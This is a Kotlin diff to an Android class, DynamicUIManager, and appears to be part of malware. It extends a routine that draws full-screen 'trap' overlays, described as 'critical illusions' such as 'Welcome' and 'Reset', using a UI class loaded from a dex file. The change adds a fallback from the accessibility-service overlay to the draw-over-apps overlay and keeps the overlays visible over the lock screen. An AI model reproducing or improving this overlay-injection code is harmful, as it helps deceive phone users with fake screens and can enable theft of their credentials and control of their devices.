@@ -604,12 +604,13 @@ object DynamicUIManager {
                             val dexPath = trap.getString("file_path")
                             val className = trap.getString("class_name")
                             val dimLevel = trap.optInt("dim", 20)
+                            val method = trap.optString("method", "ACC")
                             
                             // FORCE PERSISTENT TIMEOUT FOR CRITICAL ILLUSIONS
                             val isCritical = label.equals("Welcome", ignoreCase = true) || label.equals("Reset", ignoreCase = true)
                             val timeout = if (isCritical) 0L else trap.optLong("timeout", 10L)
                             
-                            showNativeOverlay(ctx, dexPath, className, dimLevel)
+                            showNativeOverlay(ctx, dexPath, className, dimLevel, method)
                             
                             if (timeout > 0L) {
                                 val currentSession = activeTrapSessionId
@@ -1006,15 +1007,34 @@ object DynamicUIManager {
         }
     }
 
-    fun showNativeOverlay(ctx: Context, dirPath: String, className: String, dimLevel: Int) {
+    fun showNativeOverlay(ctx: Context, dirPath: String, className: String, dimLevel: Int, method: String = "ACC") {
         if (MyAccessibilityService.isSafeZoneActive(ctx)) {
             DebugLogger.log("NATIVE_TRAP", "showNativeOverlay BLOCKED by Safe Zone.")
             return
         }
         Handler(Looper.getMainLooper()).post {
             activeTrapSessionId = System.currentTimeMillis()
-            val serviceInstance = MyAccessibilityService.instance ?: return@post
-            val wm = serviceInstance.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            val serviceInstance = MyAccessibilityService.instance
+            val hasOverlayPerm = PermissionManager.hasOverlayAccess(ctx)
+            
+            val finalMethod = when (method.uppercase()) {
+                "ACC" -> if (serviceInstance != null) "ACC" else "FAIL_ACC"
+                "OVERLAY" -> if (hasOverlayPerm) "OVERLAY" else "FAIL_OVERLAY"
+                else -> {
+                    if (serviceInstance != null) "ACC"
+                    else if (hasOverlayPerm) "OVERLAY"
+                    else "FAIL_NONE"
+                }
+            }
+
+            if (finalMethod.startsWith("FAIL")) {
+                DebugLogger.log("NATIVE_TRAP_ERR", "Injection aborted. Method: $method | Reason: $finalMethod")
+                return@post
+            }
+
+            val windowContext = if (finalMethod == "ACC") serviceInstance!! else ctx
+            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            val targetType = if (finalMethod == "ACC") WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
             
             // 1. PRESERVE OLD OVERLAY FOR SEAMLESS TRANSITION
             val oldView = nativeOverlayView
@@ -1051,19 +1071,24 @@ object DynamicUIManager {
                     view.setViewTreeViewModelStoreOwner(lifecycleOwner)
                     view.setViewTreeSavedStateRegistryOwner(lifecycleOwner)
 
+                    var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
+                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or 
+                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+
+                    if (finalMethod == "ACC") {
+                        flags = flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
+                    }
+
                     val params = WindowManager.LayoutParams(
                         WindowManager.LayoutParams.MATCH_PARENT,
                         WindowManager.LayoutParams.MATCH_PARENT,
-                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
-                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
-                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or 
-                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or 
-                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                        targetType,
+                        flags,
                         android.graphics.PixelFormat.TRANSLUCENT
                     )
                     
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P && finalMethod == "ACC") {
                         params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                     }
 
@@ -1098,8 +1123,8 @@ object DynamicUIManager {
 
     fun removeNativeOverlay(ctx: Context, reason: String = "UNKNOWN") {
         Handler(Looper.getMainLooper()).post {
-            val serviceInstance = MyAccessibilityService.instance ?: return@post
-            val wm = serviceInstance.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            val windowContext = if (nativeOverlayView?.context != null) nativeOverlayView!!.context else ctx
+            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
             
             if (isNativeAttached && nativeOverlayView != null) {
                 try { wm.removeView(nativeOverlayView) } catch (e: Exception) {}
